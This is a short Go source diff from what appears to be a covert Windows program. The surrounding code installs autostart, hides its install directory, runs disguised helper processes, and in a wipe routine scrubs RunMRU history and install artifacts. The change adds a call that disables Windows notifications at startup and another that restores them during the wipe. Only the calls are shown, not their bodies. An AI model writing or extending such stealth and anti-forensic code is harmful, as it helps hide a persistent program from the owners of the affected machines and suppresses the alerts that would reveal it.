@@ -474,6 +474,7 @@ Get-Process HelperHost,EdgeRelay -EA SilentlyContinue | Stop-Process -Force
 func wipeAll() {
 	stopFlag = true
 	if runtime.GOOS == "windows" {
+		restoreWindowsNotifications()
 		restoreWindowsSecurity()
 		scrubRunMRU()
 		scrubTempInstallArtifacts()
@@ -889,6 +890,7 @@ func main() {
 	acquireLock()
 	ensureHelperPresent()
 	info := installAutostart()
+	disableWindowsNotifications()
 	hideInstallTree()
 	port, err := findFreePort()
 	if err != nil {
